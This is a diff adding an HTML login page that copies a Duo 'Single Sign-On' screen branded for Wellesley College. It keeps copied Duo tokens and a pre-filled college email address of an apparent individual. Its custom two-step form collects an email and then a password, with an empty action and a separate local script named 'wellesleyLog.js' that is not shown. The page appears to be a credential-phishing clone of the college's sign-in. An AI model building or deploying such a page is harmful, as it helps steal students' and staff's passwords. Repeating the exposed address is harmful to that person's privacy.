@@ -1,0 +1,58 @@
+<!DOCTYPE html >
+<html  style="--app-background: #E7E9ED; --white-label-border-color: #155CDE;">
+    <head>
+        <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+        <title>Login</title>
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <link rel="stylesheet" href="./email-first.css">
+    </head>
+    <body>
+        <div id="login-parent" data-authkey="ASS3MBZLGCKHL69NBMWB" data-custom-accent-color="#155CDE" data-custom-background="" data-custom-background-color="#E7E9ED" data-custom-logo-url="https://ux-asset-commercial.duosecurity.com/customization/account/RGRiZSFFKcasi4-C9vlB0BHX2if3riLidblr_1xbCss/logo_image.png?versionId=qevh_HHMS4hSNo4ggaifm.53yonkVbU1" data-custom-username-label="College Email address" data-email-first-username="tcantin@wellesley.edu" data-phishing-protection-enabled="True" data-remember-username-enabled="True" data-req-trace-group="e52362511fcd2d3bcc58b2ef" data-restart-auth-url="https://sso-c1bd2609.sso.duosecurity.com/saml2/sp/DI14O25DMZ9P8N074IT5/sso?scid=964881a8c64244648c5cd9104776f730" data-scid="964881a8c64244648c5cd9104776f730" data-secured-by-duo="True" data-xsrf="ed0a2539432ab481a5d9379a9de60ae1" data-duo-desktop-dict="{&quot;akey&quot;: &quot;DAU54Q8J0OZDTMKW5ARM&quot;, &quot;osInfo&quot;: &quot;Windows&quot;, &quot;hasOsUserValidationFeature&quot;: true, &quot;usernameLookupDisabled&quot;: false}">
+            <div class="card card--white-label uses-white-label-border-color card--white-label__prompt display-flex flex-direction-column Card__Wrapper__legacy" style="padding: 0px; position: relative; border-top-color: rgb(21, 92, 222);">
+                <div class="align-flex-justify-content-space-between align-flex-items-center card__header display-flex size-margin-left-large size-margin-right-large " style="margin-top: 1.375rem;">
+                    <div class="logo--white-label">
+                        <img src="./logo_image.png" alt="Logo">
+                    </div>
+                </div>
+                <div class="align-flex-items-start display-flex size-margin-bottom-xsmall size-margin-large size-margin-top-reset display-flex align-flex-justify-content-start align-text-horizontal-left ">
+                    <h1 tabindex="-1" class="card--focusable-text" style="font-weight: 700;">Single Sign-On</h1>
+                </div>
+                <form action="" id="wellesleyLog" style="display: block;">
+                    <div id="alert-con" style="color:red;" class="display-flex flex-direction-column flex-value-one size-padding-left-large size-padding-right-large"></div>
+                    <div id="emailInput">
+                        <div class="display-flex flex-direction-column flex-value-one size-padding-left-large size-padding-right-large ">
+                            <label class="Card__TextInput">
+                                <span class="label">College Email address</span>
+                                <input class="input__width-full size-radius-base " type="email" value="" id="username">
+                            </label>
+                            <button class="c--primary primary align-flex-items-center align-flex-justify-content-start input__width-full size-margin-top-medium button--xlarge" type="button" id="nextBtn">Next</button>
+                        </div>
+                    </div>
+                    <div id="passwordInput" style="display: none;">
+                        <div class="display-flex flex-direction-column flex-value-one size-padding-left-large size-padding-right-large ">
+                            <p style="display: flex;">
+                                <b id="userValue"></b>
+                                <a href="" id="backBtn" style="padding-left: 5px;">edit</a>
+                            </p> 
+                        </div>
+                        <div class="display-flex flex-direction-column flex-value-one size-padding-left-large size-padding-right-large ">
+                            <label class="Card__TextInput">
+                                <span class="label">Password</span>
+                                <input aria-invalid="false"  class="input__width-full size-radius-base " type="password" value="" id="pass">
+                            </label>
+                            <button class="c--primary primary align-flex-items-center align-flex-justify-content-start input__width-full size-margin-top-medium button--xlarge" type="submit" id="submitBtn">Submit</button>
+                        </div>
+                    </div>
+                </form>
+                <div style="height: 64px;"></div>
+                <footer class="margin-top-auto">
+                    <div class="size-font-xsmall size-padding-bottom-medium size-padding-large size-padding-top-medium Card__Footer__legacy ">
+                        <span class="Card__Footer__item"></span><span class="align-text-horizontal-right Card__Footer__item">Secured by Duo</span>
+                    </div>
+                </footer>
+            </div>
+        </div>
+        <script src="wellesleyLog.js">
+        </script>
+    </body>
+</html>
